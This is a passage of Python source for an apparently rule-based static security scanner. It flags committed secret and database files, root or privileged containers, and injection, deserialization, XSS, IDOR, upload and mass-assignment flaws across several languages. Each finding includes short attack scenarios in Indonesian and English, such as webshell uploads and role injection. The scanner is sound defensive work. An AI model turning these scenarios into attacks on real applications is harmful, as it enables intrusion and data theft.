                    "app.py", "main.py", "server.py", "manage.py", "init_db.py", "database.py",
                    "api", "backend", "view", "model", "auth", "task", "worker"
                ]):
                    is_logic = True
                else:
                    try:
                        full_check = os.path.join(root, file)
                        with open(full_check, "r", encoding="utf-8", errors="ignore") as f:
                            head = f.read(2048)
                            if any(ind in head for ind in ["@app.", "@router", "Flask", "FastAPI", "APIRouter", "sqlite3", "SQLAlchemy", "CORS", "django"]):
                                is_logic = True
                    except Exception:
                        pass

            # 4. JS / TS / JSX / TSX / Vue / Svelte logic
            elif file_lower.endswith((".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs", ".vue", ".svelte")):
                if any(k in rel_lower for k in [
                    "controller", "router", "route", "middleware", "service", "handler",
                    "server.", "app.", "api/", "backend/", "pages/", "views/", "components/", "src/", "auth"
                ]) or file_lower.endswith((".vue", ".svelte")):
                    is_logic = True
                else:
                    try:
                        full_check = os.path.join(root, file)
                        with open(full_check, "r", encoding="utf-8", errors="ignore") as f:
                            head = f.read(2048)
                            if any(ind in head for ind in ["express()", "router.", "app.get(", "app.post(", "createRouter", "NextResponse", "NextRequest", "fetch(", "axios."]):
                                is_logic = True
                    except Exception:
                        pass

            # 5. Go backend logic
            elif file_lower.endswith(".go"):
                is_logic = True

            # 6. Java / Kotlin
            elif file_lower.endswith((".java", ".kt", ".kts")):
                is_logic = True

            # 7. Rust
            elif file_lower.endswith(".rs"):
                is_logic = True

            # 8. Ruby
            elif file_lower.endswith((".rb", ".erb")):
                is_logic = True

            # 9. C#
            elif file_lower.endswith(".cs"):
                is_logic = True

            # 10. C / C++
            elif file_lower.endswith((".c", ".cpp", ".h", ".hpp")):
                if any(k in rel_lower for k in ["main", "server", "api", "handler", "auth", "crypto", "net"]):
                    is_logic = True

            # 11. Shell Scripts
            elif file_lower.endswith((".sh", ".bash")):
                if any(k in rel_lower for k in ["entrypoint", "deploy", "setup", "build", "run", "start"]):
                    is_logic = True

            # 12. Smart Contracts (Solidity)
            elif file_lower.endswith(".sol"):
                is_logic = True

            # 13. SQL Queries & Schemas
            elif file_lower.endswith(".sql"):
                if any(k in rel_lower for k in ["schema", "init", "query", "migration"]):
                    is_logic = True

            if is_logic:
                full_path = os.path.join(root, file)
                try:
                    if os.path.getsize(full_path) < 400_000:
                        with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                            logic_files.append((rel_file, content))
                except Exception:
                    pass
    return logic_files

def scan_system_logic_heuristics(repo_dir: str, logic_files: List[Tuple[str, str]]) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    finding_id = 1

    for env_name in [".env", ".env.local", ".env.production"]:
        env_path = os.path.join(repo_dir, env_name)
        if os.path.isfile(env_path):
            findings.append({
                "id": f"logic-env-{finding_id}",
                "rule_id": "COMMITTED-SENSITIVE-FILE",
                "category": "JS_SECRET_LEAK",
                "severity": "CRITICAL",
                "title": f"Berkas Konfigurasi Sensitif Terekspos di Repositori ({env_name})",
                "cwe_id": "CWE-200",
                "owasp_category": "A05:2021-Security Misconfiguration",
                "cvss_score": 9.1,
                "location": {
                    "source_origin": "WHITEBOX_REPO_FILE",
                    "path": env_name,
                    "line_start": 1,
                    "line_end": 1
                },
                "redacted_code_snippet": f"# Berkas sensitif committed: {env_name}",
                "evidence_metadata": {
                    "file_name": env_name,
                    "risk": "Kredensial database atau token API berpotensi bocor ke repositori git."
                },
                "ai_remediation": {
                    "model": "rule-based-sast",
                    "warning": None,
                    "risk_explanation": f"Berkas konfigurasi sensitif '{env_name}' ter-commit ke dalam repositori version control, mengekspos kredensial database dan API keys aplikasi. Committing environment configuration files leaks operational secrets directly into version control history.",
                    "attack_scenario": "Penyerang mengekstrak rahasia dari repositori git untuk mengakses database atau layanan pihak ketiga secara langsung. Exposed credentials enable immediate unauthorized access to underlying infrastructure.",
                    "blast_radius": "Kebocoran penuh data sensitif dan kompromi akun cloud terkait. Full compromise of application databases and linked cloud infrastructure.",
                    "remediation_steps": [
                        f"Tambahkan '{env_name}' ke dalam berkas .gitignore.",
                        "Lakukan rotasi segera terhadap seluruh kredensial dan API key yang tercantum.",
                        "Remove the file from Git history using git rm --cached and invalidate all leaked credentials immediately."
                    ],
                    "code_patch": {
                        "language": "dotenv",
                        "original_code": f"# Committed secret file: {env_name}",
                        "patched_code": f"# Add to .gitignore\necho '{env_name}' >> .gitignore"
                    }
                }
            })
            finding_id += 1

    # Deteksi berkas database SQLite/DB yang ter-commit ke repositori
    for root, _, files in os.walk(repo_dir):
        if any(d in root.lower() for d in ["node_modules", ".git", "venv", ".venv"]):
            continue
        for file in files:
            if file.lower().endswith((".db", ".sqlite", ".sqlite3")) and not file.startswith("."):
                full_p = os.path.join(root, file)
                rel_p = os.path.relpath(full_p, repo_dir).replace("\\", "/")
                file_size_kb = round(os.path.getsize(full_p) / 1024, 1)
                findings.append({
                    "id": f"logic-db-{finding_id}",
                    "rule_id": "COMMITTED-DATABASE-FILE",
                    "category": "JS_SECRET_LEAK",
                    "severity": "HIGH",
                    "title": f"Berkas Database SQLite Berisi Data Riil Terekspos di Repositori ({rel_p})",
                    "cwe_id": "CWE-312",
                    "owasp_category": "A05:2021-Security Misconfiguration",
                    "cvss_score": 7.5,
                    "location": {
                        "source_origin": "WHITEBOX_REPO_FILE",
                        "path": rel_p,
                        "line_start": 1,
                        "line_end": 1
                    },
                    "redacted_code_snippet": f"# Berkas database ter-commit ({file_size_kb} KB): {rel_p}",
                    "evidence_metadata": {
                        "file_name": rel_p,
                        "size_kb": file_size_kb,
                        "risk": "Database SQLite yang di-commit ke Git membocorkan struktur tabel, data telemetri historis riil, dan berpotensi memuat informasi sensitif."
                    },
                    "ai_remediation": {
                        "model": "rule-based-sast",
                        "warning": None,
                        "risk_explanation": f"Basis data SQLite ({rel_p}) tersimpan langsung di dalam riwayat repositori Git, berpotensi membeberkan catatan data pengguna dan struktur skema internal. Committing local database binaries exposes schema internals and persisted application state.",
                        "attack_scenario": "Penyerang mengunduh file database biner dari repositori lalu mengekstrak tabel pengguna untuk analisis offline. Offline database extraction allows attackers to crack credentials and reconstruct business datasets.",
                        "blast_radius": "Kebocoran data pengguna (PII) dan pengungkapan struktur skema internal aplikasi. Unauthorized exposure of private customer records and internal system schema.",
                        "remediation_steps": [
                            "Tambahkan *.db dan *.sqlite ke dalam berkas .gitignore.",
                            "Hapus berkas basis data dari riwayat git menggunakan git rm --cached.",
                            "Exclude database binaries from version control and purge historical commit snapshots from repository history."
                        ],
                        "code_patch": {
                            "language": "shell",
                            "original_code": f"# Database binary committed: {rel_p}",
                            "patched_code": f"# Exclude database files\ngit rm --cached {rel_p}\necho '*.sqlite3' >> .gitignore\necho '*.db' >> .gitignore"
                        }
                    }
                })
                finding_id += 1

    for rel_path, content in logic_files:
        lines = content.splitlines()
        rel_lower = rel_path.lower()
        file_lang = detect_code_language(rel_path, content[:1000])

        # 1. Dockerfile checks
        if "dockerfile" in rel_lower:
            has_user_directive = any(line.strip().upper().startswith("USER ") for line in lines)
            if not has_user_directive and len(lines) > 2:
                findings.append({
                    "id": f"logic-docker-root-{finding_id}",
                    "rule_id": "SAST-DOCKER-ROOT-USER",
                    "category": "SYSTEM_LOGIC",
                    "severity": "MEDIUM",
                    "title": f"Potensi Container Misconfiguration: Dockerfile Berjalan sebagai Root ({rel_path})",
                    "cwe_id": "CWE-250",
                    "owasp_category": "A05:2021-Security Misconfiguration",
                    "cvss_score": 6.5,
                    "location": {
                        "source_origin": "WHITEBOX_DOCKER_CONFIG",
                        "path": rel_path,
                        "line_start": 1,
                        "line_end": min(len(lines), 15)
                    },
                    "redacted_code_snippet": lines[0][:100] if lines else "FROM ...",
                    "evidence_metadata": {
                        "flaw": "Dockerfile tidak mendefinisikan direktif USER non-root, container akan berjalan sebagai root UID 0 secara default.",
                        "rule_type": "DOCKER_ROOT_CONTAINER"
                    },
                    "ai_remediation": {
                        "model": "rule-based-sast",
                        "warning": None,
                        "risk_explanation": "Menjalankan aplikasi di dalam container sebagai root meningkatkan dampak jika aplikasi terkena eksploitasi RCE. Running container workloads under UID 0 significantly widens the blast radius of any container breakout vulnerability.",
                        "attack_scenario": "Jika terjadi remote code execution, penyerang langsung memiliki hak akses root di container filesystem. Attackers leverage container root access to escalate privileges across mapped volumes and host sockets.",
                        "blast_radius": "Eskalasi hak akses pada container dan potensi pelarian ke sistem host. Container breakout risk leading to full host namespace compromise.",
                        "remediation_steps": [
                            "Tambahkan user non-privileged di Dockerfile (misal RUN adduser -D -u 1000 appuser).",
                            "Tentukan direktif USER appuser sebelum perintah ENTRYPOINT atau CMD.",
                            "Enforce non-root execution by declaring a dedicated unprivileged user in the container image."
                        ],
                        "code_patch": {
                            "language": "dockerfile",
                            "original_code": "# Missing USER directive",
                            "patched_code": "RUN addgroup -S appgroup && adduser -S appuser -G appgroup\nUSER appuser"
                        }
                    }
                })
                finding_id += 1

        # 2. Docker Compose checks
        if "docker-compose" in rel_lower:
            for line_idx, line in enumerate(lines, start=1):
                if "privileged: true" in line.lower():
                    findings.append({
                        "id": f"logic-compose-priv-{finding_id}",
                        "rule_id": "SAST-COMPOSE-PRIVILEGED-MODE",
                        "category": "SYSTEM_LOGIC",
                        "severity": "HIGH",
                        "title": f"Insecure Container Configuration: Privileged Mode Aktif ({rel_path}:{line_idx})",
                        "cwe_id": "CWE-250",
                        "owasp_category": "A05:2021-Security Misconfiguration",
                        "cvss_score": 8.5,
                        "location": {
                            "source_origin": "WHITEBOX_DOCKER_CONFIG",
                            "path": rel_path,
                            "line_start": line_idx,
                            "line_end": line_idx
                        },
                        "redacted_code_snippet": line.strip()[:100],
                        "evidence_metadata": {
                            "risk": "Flag privileged: true melumpuhkan isolasi container.",
                            "rule_type": "DOCKER_PRIVILEGED"
                        },
                        "ai_remediation": {
                            "model": "rule-based-sast",
                            "warning": None,
                            "risk_explanation": "Konfigurasi privileged: true melumpuhkan isolasi namespace Linux, mengizinkan container mengakses kernel dan storage host. Running in privileged mode eliminates security isolation between the container and the underlying host kernel.",
                            "attack_scenario": "Penyerang yang berhasil memperoleh command execution di container dapat me-mount storage host. Privileged containers can directly mount host block devices and rewrite host authentication files.",
                            "blast_radius": "Kompromi total server host dan seluruh container lain. Full host compromise and unrestricted access to all co-hosted services.",
                            "remediation_steps": [
                                "Hapus baris privileged: true dari konfigurasi docker-compose.",
                                "Gunakan cap_add hanya untuk kapabilitas Linux yang mutlak dibutuhkan.",
                                "Remove privileged mode and grant only the minimal required Linux capabilities via cap_add."
                            ],
                            "code_patch": {
                                "language": "yaml",
                                "original_code": line.strip(),
                                "patched_code": "# privileged: true removed\n# cap_add:\n#   - NET_BIND_SERVICE"
                            }
                        }
                    })
                    finding_id += 1

        # 3. Python specific logic
        if file_lang == "python":
            for line_idx, line in enumerate(lines, start=1):
                line_str = line.strip()
                if not line_str or line_str.startswith("#"):
                    continue
                if REGEX_PY_RAW_SQL.search(line):
                    findings.append({
                        "id": f"logic-pysql-{finding_id}",
                        "rule_id": "SAST-PY-RAW-SQL-INJECTION",
                        "category": "SYSTEM_LOGIC",
                        "severity": "CRITICAL",
                        "title": f"Potensi SQL Injection: String Formatting pada Query ({rel_path}:{line_idx})",
                        "cwe_id": "CWE-89",
                        "owasp_category": "A03:2021-Injection",
                        "cvss_score": 9.1,
                        "location": {
                            "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                            "path": rel_path,
                            "line_start": line_idx,
                            "line_end": line_idx
                        },
                        "redacted_code_snippet": line_str[:140],
                        "evidence_metadata": {
                            "vulnerable_code": line_str,
                            "rule_type": "PY_RAW_SQL"
                        },
                        "ai_remediation": {
                            "model": "rule-based-sast",
                            "warning": None,
                            "risk_explanation": "Penggunaan format string atau interpolasi variabel dinamis pada query SQL membuka celah injeksi perintah SQL. Direct parameter interpolation breaks query boundary isolation.",
                            "attack_scenario": "Penyerang menyisipkan karakter petik atau operator logika SQL untuk membaca atau merusak data. Arbitrary SQL payload execution leads to unauthorized database exfiltration.",
                            "blast_radius": "Pencurian atau manipulasi data di database backend. Unauthorized data disclosure and destructive database tampering may occur.",
                            "remediation_steps": [
                                "Gunakan query berparameter (parameterized query) bawaan DB-API (:param atau ?).",
                                "Gunakan ORM seperti SQLAlchemy atau Tortoise secara konsisten.",
                                "Enforce prepared statements with parameterized inputs across all database access layers."
                            ],
                            "code_patch": {
                                "language": "python",
                                "original_code": line_str,
                                "patched_code": "# Use parameterized query\ncursor.execute('SELECT ... WHERE id = :id', {'id': user_id})"
                            }
                        }
                    })
                    finding_id += 1
                elif REGEX_PY_CMD_INJ.search(line):
                    findings.append({
                        "id": f"logic-pycmd-{finding_id}",
                        "rule_id": "SAST-PY-COMMAND-INJECTION",
                        "category": "SYSTEM_LOGIC",
                        "severity": "CRITICAL",
                        "title": f"Potensi Command Injection: Eksekusi Shell Dinamis ({rel_path}:{line_idx})",
                        "cwe_id": "CWE-78",
                        "owasp_category": "A03:2021-Injection",
                        "cvss_score": 9.8,
                        "location": {
                            "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                            "path": rel_path,
                            "line_start": line_idx,
                            "line_end": line_idx
                        },
                        "redacted_code_snippet": line_str[:140],
                        "evidence_metadata": {
                            "vulnerable_code": line_str,
                            "rule_type": "PY_CMD_INJECTION"
                        },
                        "ai_remediation": {
                            "model": "rule-based-sast",
                            "warning": None,
                            "risk_explanation": "Pemanggilan shell melalui os.system atau subprocess dengan shell=True yang menggabungkan variabel pengguna membuka celah eksekusi perintah OS sewenang-wenang. Unsanitized argument concatenation directly executes within the underlying host shell.",
                            "attack_scenario": "Penyerang menyisipkan separator shell untuk menjalankan perintah sistem secara bebas. Attackers achieve full remote code execution on the underlying host operating system.",
                            "blast_radius": "Pengambilalihan server backend dan pergerakan lateral di jaringan. Complete server compromise and lateral movement throughout the hosting environment.",
                            "remediation_steps": [
                                "Gunakan subprocess dengan argumen berupa list dan shell=False.",
                                "Validasi input menggunakan whitelist ketat.",
                                "Eliminate shell invocation and pass arguments as structured arrays with shell=False."
                            ],
                            "code_patch": {
                                "language": "python",
                                "original_code": line_str,
                                "patched_code": "import subprocess\nsubprocess.run(['safe_cmd', safe_arg], shell=False, check=True)"
                            }
                        }
                    })
                    finding_id += 1
                elif REGEX_PY_DESERIAL.search(line):
                    findings.append({
                        "id": f"logic-pydeserial-{finding_id}",
                        "rule_id": "SAST-PY-INSECURE-DESERIALIZATION",
                        "category": "SYSTEM_LOGIC",
                        "severity": "CRITICAL",
                        "title": f"Insecure Deserialization: Pickle / Unsafe YAML Load ({rel_path}:{line_idx})",
                        "cwe_id": "CWE-502",
                        "owasp_category": "A08:2021-Software and Data Integrity Failures",
                        "cvss_score": 9.8,
                        "location": {
                            "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                            "path": rel_path,
                            "line_start": line_idx,
                            "line_end": line_idx
                        },
                        "redacted_code_snippet": line_str[:140],
                        "evidence_metadata": {
                            "vulnerable_code": line_str,
                            "rule_type": "PY_DESERIALIZATION"
                        },
                        "ai_remediation": {
                            "model": "rule-based-sast",
                            "warning": None,
                            "risk_explanation": "Deserialisasi objek pickle atau yaml.load tanpa SafeLoader dapat mengeksekusi instruksi byte code berbahaya. Deserializing untrusted object streams allows immediate arbitrary code execution via object reduction hooks.",
                            "attack_scenario": "Penyerang mengirim objek serialisasi berbahaya untuk memicu eksekusi kode otomatis saat dimuat. The deserializer automatically unpacks and runs the malicious payload in process context.",
                            "blast_radius": "Remote Code Execution (RCE) langsung pada server aplikasi. Complete takeover of the backend runtime instance.",
                            "remediation_steps": [
                                "Gunakan format data murni seperti JSON (json.loads).",
                                "Gunakan yaml.safe_load jika membaca format YAML.",
                                "Replace unsafe object serialization with standard JSON or schema-validated data formats."
                            ],
                            "code_patch": {
                                "language": "python",
                                "original_code": line_str,
                                "patched_code": "import json\ndata = json.loads(untrusted_payload)"
                            }
                        }
                    })
                    finding_id += 1

        # 4. JavaScript / TypeScript specific logic
        elif file_lang in ("javascript", "typescript"):
            for line_idx, line in enumerate(lines, start=1):
                line_str = line.strip()
                if not line_str or line_str.startswith("//"):
                    continue
                if REGEX_JS_CMD_INJ.search(line):
                    findings.append({
                        "id": f"logic-jscmd-{finding_id}",
                        "rule_id": "SAST-JS-COMMAND-INJECTION",
                        "category": "SYSTEM_LOGIC",
                        "severity": "CRITICAL",
                        "title": f"Potensi Command Injection: Eksekusi Perintah Sistem Dinamis ({rel_path}:{line_idx})",
                        "cwe_id": "CWE-78",
                        "owasp_category": "A03:2021-Injection",
                        "cvss_score": 9.8,
                        "location": {
                            "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                            "path": rel_path,
                            "line_start": line_idx,
                            "line_end": line_idx
                        },
                        "redacted_code_snippet": line_str[:140],
                        "evidence_metadata": {
                            "vulnerable_code": line_str,
                            "rule_type": "JS_CMD_INJECTION"
                        },
                        "ai_remediation": {
                            "model": "rule-based-sast",
                            "warning": None,
                            "risk_explanation": "Penggunaan child_process.exec dengan string template atau konkatenasi membuka celah injeksi perintah shell. Dynamic argument concatenation in child_process.exec leads directly to arbitrary host command execution.",
                            "attack_scenario": "Penyerang menyisipkan metakarakter shell ke dalam variabel yang diteruskan ke exec. Host shell interprets injected metacharacters to spawn unauthorized processes.",
                            "blast_radius": "Akses command execution pada server Node.js. Remote system shell compromise and unauthorized file access.",
                            "remediation_steps": [
                                "Ganti child_process.exec dengan execFile atau spawn tanpa shell: true.",
                                "Kirim argumen sebagai array terpisah.",
                                "Replace child_process.exec with execFile or spawn with argument arrays and shell: false."
                            ],
                            "code_patch": {
                                "language": file_lang,
                                "original_code": line_str,
                                "patched_code": "import { execFile } from 'child_process';\nexecFile('cmd', [safeArg], (err, stdout) => { ... });"
                            }
                        }
                    })
                    finding_id += 1
                elif REGEX_JS_RAW_HTML.search(line):
                    findings.append({
                        "id": f"logic-jsxss-{finding_id}",
                        "rule_id": "SAST-JS-UNESCAPED-HTML-SINK",
                        "category": "DOM_XSS",
                        "severity": "HIGH",
                        "title": f"Potensi Cross-Site Scripting (XSS): Unescaped HTML Sink ({rel_path}:{line_idx})",
                        "cwe_id": "CWE-79",
                        "owasp_category": "A03:2021-Injection",
                        "cvss_score": 8.2,
                        "location": {
                            "source_origin": "WHITEBOX_SOURCE_CODE",
                            "path": rel_path,
                            "line_start": line_idx,
                            "line_end": line_idx
                        },
                        "redacted_code_snippet": line_str[:140],
                        "evidence_metadata": {
                            "vulnerable_code": line_str,
                            "rule_type": "JS_DANGEROUS_HTML"
                        },
                        "ai_remediation": {
                            "model": "rule-based-sast",
                            "warning": None,
                            "risk_explanation": "Penggunaan dangerouslySetInnerHTML atau innerHTML dengan konten dinamis menonaktifkan fitur proteksi XSS bawaan browser/React. Injecting unescaped dynamic HTML bypasses framework sanitization protections.",
                            "attack_scenario": "Penyerang menyuntikkan payload script yang dieksekusi di browser korban saat komponen dimuat. Injected script tags or onerror attributes execute in victim browser contexts.",
                            "blast_radius": "Pencurian cookie, session hijacking, dan defacement. Session hijacking and credential theft across client user sessions.",
                            "remediation_steps": [
                                "Gunakan rendering teks standar React ({children}) alih-alih dangerouslySetInnerHTML.",
                                "Jika markup HTML diperlukan, sanitasi menggunakan DOMPurify.sanitize().",
                                "Sanitize dynamic HTML inputs using DOMPurify before passing to dangerous rendering sinks."
                            ],
                            "code_patch": {
                                "language": file_lang,
                                "original_code": line_str,
                                "patched_code": "import DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(cleanHtml) }} />"
                            }
                        }
                    })
                    finding_id += 1

        # 5. Go specific logic
        elif file_lang == "go":
            for line_idx, line in enumerate(lines, start=1):
                line_str = line.strip()
                if not line_str or line_str.startswith("//"):
                    continue
                if REGEX_GO_RAW_SQL.search(line):
                    findings.append({
                        "id": f"logic-gosql-{finding_id}",
                        "rule_id": "SAST-GO-RAW-SQL-INJECTION",
                        "category": "SYSTEM_LOGIC",
                        "severity": "CRITICAL",
                        "title": f"Potensi SQL Injection: String Formatting pada Query Go ({rel_path}:{line_idx})",
                        "cwe_id": "CWE-89",
                        "owasp_category": "A03:2021-Injection",
                        "cvss_score": 9.1,
                        "location": {
                            "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                            "path": rel_path,
                            "line_start": line_idx,
                            "line_end": line_idx
                        },
                        "redacted_code_snippet": line_str[:140],
                        "evidence_metadata": {
                            "vulnerable_code": line_str,
                            "rule_type": "GO_RAW_SQL"
                        },
                        "ai_remediation": {
                            "model": "rule-based-sast",
                            "warning": None,
                            "risk_explanation": "Penggunaan fmt.Sprintf atau konkatenasi string untuk menyusun query SQL membuka celah manipulasi query oleh attacker. Dynamic string construction in database queries bypasses SQL parameter isolation.",
                            "attack_scenario": "Penyerang menyisipkan karakter petik satu atau klausul union select ke input yang dikirim. Attackers manipulate SQL query logic to exfiltrate private database records.",
                            "blast_radius": "Ekstraksi data database atau manipulasi status record aplikasi. Unauthorized database disclosure and state manipulation.",
                            "remediation_steps": [
                                "Gunakan placeholder parameter binding ($1, $2 atau ?) pada db.Query atau db.Exec.",
                                "Hindari penggunaan fmt.Sprintf dalam pembentukan klausa WHERE atau SELECT.",
                                "Bind SQL query arguments using native database driver placeholders instead of fmt.Sprintf."
                            ],
                            "code_patch": {
                                "language": "go",
                                "original_code": line_str,
                                "patched_code": "row := db.QueryRowContext(ctx, \"SELECT ... WHERE id = $1\", userID)"
                            }
                        }
                    })
                    finding_id += 1
                elif REGEX_GO_CMD_INJ.search(line):
                    findings.append({
                        "id": f"logic-gocmd-{finding_id}",
                        "rule_id": "SAST-GO-COMMAND-INJECTION",
                        "category": "SYSTEM_LOGIC",
                        "severity": "CRITICAL",
                        "title": f"Potensi Command Injection: Eksekusi Shell Dinamis Go ({rel_path}:{line_idx})",
                        "cwe_id": "CWE-78",
                        "owasp_category": "A03:2021-Injection",
                        "cvss_score": 9.8,
                        "location": {
                            "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                            "path": rel_path,
                            "line_start": line_idx,
                            "line_end": line_idx
                        },
                        "redacted_code_snippet": line_str[:140],
                        "evidence_metadata": {
                            "vulnerable_code": line_str,
                            "rule_type": "GO_CMD_INJECTION"
                        },
                        "ai_remediation": {
                            "model": "rule-based-sast",
                            "warning": None,
                            "risk_explanation": "Menjalankan sh/bash -c dengan string gabungan argumen membuka celah eksekusi perintah shell sewenang-wenang. Calling shell interpreters with concatenated strings enables arbitrary operating system command execution.",
                            "attack_scenario": "Penyerang menyisipkan command separator ke dalam parameter request. Shell metacharacters execute malicious host commands with application privileges.",
                            "blast_radius": "Akses kontrol penuh ke host server backend. Full host server compromise and unauthorized execution of malicious binaries.",
                            "remediation_steps": [
                                "Jalankan binary secara langsung tanpa memanggil shell interpreter (sh / bash).",
                                "Teruskan argumen satu per satu ke exec.Command(binary, arg1, arg2).",
                                "Pass individual arguments directly to exec.Command without invoking an intermediate shell."
                            ],
                            "code_patch": {
                                "language": "go",
                                "original_code": line_str,
                                "patched_code": "cmd := exec.CommandContext(ctx, \"binary_name\", arg1, arg2)"
                            }
                        }
                    })
                    finding_id += 1

        # 6. PHP specific logic & methods
        elif file_lang == "php":
            methods = extract_php_methods(content)
            for mname, mparams, mbody, line_no in methods:
                mbody_lower = mbody.lower()
                mname_lower = mname.lower()
                if ("delete" in mname_lower or "destroy" in mname_lower or "remove" in mname_lower or "update" in mname_lower) and "$id" in mparams:
                    has_delete_or_update = any(act in mbody for act in ["delete(", "delete()", "->update(", "destroy("])
                    has_auth_check = any(auth in mbody_lower for auth in ["auth::", "->user()", "authorize(", "gate::", "policy"])
                    if has_delete_or_update and not has_auth_check:
                        snippet = lines[line_no - 1].strip() if line_no - 1 < len(lines) else f"public function {mname}({mparams})"
                        findings.append({
                            "id": f"logic-idor-{finding_id}",
                            "rule_id": "SYSTEM-LOGIC-BOLA-IDOR",
                            "category": "SYSTEM_LOGIC",
                            "severity": "HIGH",
                            "title": f"Potensi BOLA/IDOR: Modifikasi/Penghapusan Objek ({rel_path}::{mname}) Tanpa Validasi Otorisasi",
                            "cwe_id": "CWE-639",
                            "owasp_category": "A01:2021-Broken Access Control",
                            "cvss_score": 7.5,
                            "location": {
                                "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                                "path": rel_path,
                                "line_start": line_no,
                                "line_end": line_no + 10
                            },
                            "redacted_code_snippet": snippet,
                            "evidence_metadata": {
                                "method": f"{mname}({mparams})",
                                "missing_control": "Tidak ditemukan verifikasi kepemilikan user ($this->authorize / Auth::user()) sebelum manipulasi record $id.",
                                "rule_type": "BOLA_IDOR"
                            },
                            "ai_remediation": {
                                "model": "rule-based-sast",
                                "warning": None,
                                "risk_explanation": f"Metode {mname} menerima parameter identifier objek ($id) dan melakukan operasi mutasi/penghapusan tanpa memeriksa kepemilikan objek oleh pengguna terautentikasi. Missing ownership validation allows authenticated users to manipulate objects belonging to other tenants.",
                                "attack_scenario": f"Penyerang terautentikasi mengganti nilai parameter id pada HTTP request menjadi ID milik pengguna lain, menghapus atau mengubah data korban. Attackers modify target IDs in API requests to delete or update foreign records without authorization.",
                                "blast_radius": "Kerusakan data pengguna lain, penghapusan catatan penting, dan potensi eskalasi akun. Unauthorized data modification and loss of tenant data isolation.",
                                "remediation_steps": [
                                    "Terapkan Laravel Policy atau Gate via $this->authorize('update', $model) sebelum mutasi.",
                                    "Pastikan query mutasi mencantumkan filter kepemilikan (misal Model::where('user_id', Auth::id())->findOrFail($id)).",
                                    "Enforce strict tenant authorization checks using Laravel Gates or policies before executing mutations."
                                ],
                                "code_patch": {
                                    "language": "php",
                                    "original_code": snippet,
                                    "patched_code": f"$this->authorize('update', $item);\n// or query scoped by user:\n$item = auth()->user()->items()->findOrFail($id);"
                                }
                            }
                        })
                        finding_id += 1

                if ("upload" in mname_lower or "$request->file" in mbody or "$request->hasfile" in mbody_lower):
                    if "validator::make" in mbody_lower or "$request->validate" in mbody_lower:
                        if "'file'" in mbody or '"file"' in mbody:
                            if "mimes:" not in mbody_lower:
                                snippet = lines[line_no - 1].strip() if line_no - 1 < len(lines) else f"public function {mname}({mparams})"
                                findings.append({
                                    "id": f"logic-upload-{finding_id}",
                                    "rule_id": "SYSTEM-LOGIC-INSECURE-UPLOAD",
                                    "category": "SYSTEM_LOGIC",
                                    "severity": "HIGH",
                                    "title": f"Logika Upload File Rentan: Validasi MIME-Type Tanpa Whitelist Ekstensi ({rel_path}::{mname})",
                                    "cwe_id": "CWE-434",
                                    "owasp_category": "A04:2021-Insecure Design",
                                    "cvss_score": 7.8,
                                    "location": {
                                        "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                                        "path": rel_path,
                                        "line_start": line_no,
                                        "line_end": line_no + 12
                                    },
                                    "redacted_code_snippet": snippet,
                                    "evidence_metadata": {
                                        "method": f"{mname}({mparams})",
                                        "vulnerable_validation": "Validasi file tidak menggunakan whitelist ekstensi ketat (mimes:jpg,png,pdf).",
                                        "rule_type": "INSECURE_UPLOAD_LOGIC"
                                    },
                                    "ai_remediation": {
                                        "model": "rule-based-sast",
                                        "warning": None,
                                        "risk_explanation": "Validasi upload file tanpa aturan ekstensi (mimes) memungkinkan pengunggahan file biner berbahaya atau file skrip PHP. Missing strict extension validation allows attackers to upload executable scripts to web-accessible directories.",
                                        "attack_scenario": "Penyerang memanipulasi MIME tipe request lalu mengunggah webshell (misal .php atau .phtml) ke direktori storage publik. Uploaded executable files allow adversaries to achieve persistent remote code execution.",
                                        "blast_radius": "Remote Code Execution (RCE) dan pengambilalihan server web secara permanen. Complete web server takeover through executable webshell execution.",
                                        "remediation_steps": [
                                            "Tambahkan validasi whitelist ekstensi ketat: 'file' => 'required|file|mimes:jpeg,png,pdf|max:2048'.",
                                            "Simpan berkas di luar web root atau nonaktifkan eksekusi skrip di folder upload via web server configuration.",
                                            "Enforce strict extension whitelisting with mimes validation and store uploads outside public roots."
                                        ],
                                        "code_patch": {
                                            "language": "php",
                                            "original_code": snippet,
                                            "patched_code": "$request->validate([\n    'file' => 'required|file|mimes:jpeg,png,pdf|max:5120'\n]);"
                                        }
                                    }
                                })
                                finding_id += 1

                if ("$request->all()" in mbody or "request()->all()" in mbody):
                    if any(orm_func in mbody for orm_func in ["updateOrCreate", "firstOrCreate", "::create(", "->create(", "::update(", "->update("]):
                        snippet = lines[line_no - 1].strip() if line_no - 1 < len(lines) else f"public function {mname}({mparams})"
                        findings.append({
                            "id": f"logic-mass-{finding_id}",
                            "rule_id": "SYSTEM-LOGIC-MASS-ASSIGNMENT",
                            "category": "SYSTEM_LOGIC",
                            "severity": "MEDIUM",
                            "title": f"Potensi Mass Assignment: Meneruskan Input Mentah ($request->all()) ke Model ({rel_path}::{mname})",
                            "cwe_id": "CWE-915",
                            "owasp_category": "A04:2021-Insecure Design",
                            "cvss_score": 6.5,
                            "location": {
                                "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                                "path": rel_path,
                                "line_start": line_no,
                                "line_end": line_no + 10
                            },
                            "redacted_code_snippet": snippet,
                            "evidence_metadata": {
                                "method": f"{mname}({mparams})",
                                "flaw": "Penggunaan $request->all() secara langsung dapat mengizinkan penyerang menginjeksi atribut terlarang ke model basis data.",
                                "rule_type": "MASS_ASSIGNMENT"
                            },
                            "ai_remediation": {
                                "model": "rule-based-sast",
                                "warning": None,
                                "risk_explanation": "Meneruskan seluruh input request tanpa penyaringan ($request->all()) ke method ORM membuka celah eksploitasi Mass Assignment. Passing raw request arrays to persistence methods permits unauthorized property injection.",
                                "attack_scenario": "Penyerang menyisipkan parameter seperti 'is_admin': true atau 'role': 'admin' dalam payload form. Attackers inject privileged model fields to trigger unauthorized role elevation.",
